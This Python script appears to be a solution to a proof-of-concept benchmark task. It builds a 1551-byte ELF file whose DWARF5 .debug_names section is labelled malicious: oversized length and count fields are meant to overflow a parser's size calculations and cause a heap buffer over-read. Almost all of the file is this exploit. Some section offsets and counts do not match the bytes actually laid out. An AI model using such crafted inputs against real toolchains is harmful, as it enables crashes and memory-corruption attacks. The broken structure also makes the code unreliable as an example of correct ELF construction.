import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF header for a 64-bit ELF file
        elf_header = b''
        elf_header += b'\x7fELF'  # ELF magic
        elf_header += b'\x02'      # 64-bit
        elf_header += b'\x01'      # Little endian
        elf_header += b'\x01'      # ELF version
        elf_header += b'\x00'      # OS ABI (System V)
        elf_header += b'\x00'      # ABI version
        elf_header += b'\x00' * 7  # Padding
        elf_header += b'\x02\x00'  # ET_EXEC
        elf_header += b'\x3e\x00'  # x86-64
        elf_header += b'\x01\x00\x00\x00'  # ELF version
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Entry point
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Program header offset
        elf_header += b'\x40\x00\x00\x00\x00\x00\x00\x00'  # Section header offset (64)
        elf_header += b'\x00\x00\x00\x00'  # Flags
        elf_header += b'\x40\x00'          # ELF header size
        elf_header += b'\x00\x00'          # Program header size
        elf_header += b'\x00\x00'          # Program header count
        elf_header += b'\x40\x00'          # Section header size
        elf_header += b'\x02\x00'          # Section header count (2)
        elf_header += b'\x01\x00'          # Section string table index
        
        # Create .shstrtab section
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        
        # Create malicious .debug_names section
        # DWARF5 .debug_names header structure:
        # unit_length (4 or 12 bytes), version (2), padding (2),
        # comp_unit_count (4), local_type_unit_count (4), foreign_type_unit_count (4),
        # bucket_count (4), name_count (4), abbrev_table_size (4), augmentation_string_size (4)
        
        # Craft malicious header to trigger miscalculation
        # Set large values that cause overflow in calculations
        debug_names = b''
        
        # Use 32-bit format for unit_length
        unit_length = 0xfffffff0  # Large value that will cause overflow
        debug_names += struct.pack('<I', unit_length)
        
        # Version 5
        debug_names += struct.pack('<H', 5)
        
        # Padding
        debug_names += b'\x00\x00'
        
        # Set counts to trigger the vulnerability
        # The bug is in calculation: total = count1 + count2 + count3
        # where each is 32-bit, but total can overflow 32-bit
        debug_names += struct.pack('<I', 0x80000000)  # comp_unit_count
        debug_names += struct.pack('<I', 0x80000000)  # local_type_unit_count
        debug_names += struct.pack('<I', 0x80000000)  # foreign_type_unit_count
        
        # These cause overflow in calculation
        debug_names += struct.pack('<I', 0x80000000)  # bucket_count
        debug_names += struct.pack('<I', 0x80000000)  # name_count
        
        # Small abbrev table
        debug_names += struct.pack('<I', 100)
        
        # No augmentation string
        debug_names += struct.pack('<I', 0)
        
        # Add some data to trigger heap buffer overflow when reading
        # The vulnerability causes reading beyond allocated buffer
        remaining = 1551 - len(debug_names)
        debug_names += b'A' * remaining
        
        # Create section headers
        section_headers = b''
        
        # Null section header
        section_headers += b'\x00' * 64
        
        # .debug_names section header
        section_headers += struct.pack('<IIQQQQIIQQ', 
            11,  # sh_name offset in .shstrtab
            1,   # SHT_PROGBITS
            0,   # sh_flags
            0,   # sh_addr
            128, # sh_offset (after ELF header + section headers)
            len(debug_names),  # sh_size
            0,   # sh_link
            0,   # sh_info
            1,   # sh_addralign
            0)   # sh_entsize
        
        # .shstrtab section header
        shstrtab_offset = 128 + len(debug_names)
        section_headers += struct.pack('<IIQQQQIIQQ',
            1,   # sh_name offset in .shstrtab
            3,   # SHT_STRTAB
            0,   # sh_flags
            0,   # sh_addr
            shstrtab_offset,  # sh_offset
            len(shstrtab),  # sh_size
            0,   # sh_link
            0,   # sh_info
            1,   # sh_addralign
            0)   # sh_entsize
        
        # Assemble the complete ELF
        elf = elf_header + section_headers + debug_names + shstrtab
        
        # Pad to exact size
        if len(elf) < 1551:
            elf += b'\x00' * (1551 - len(elf))
        elif len(elf) > 1551:
            elf = elf[:1551]
        
        return elf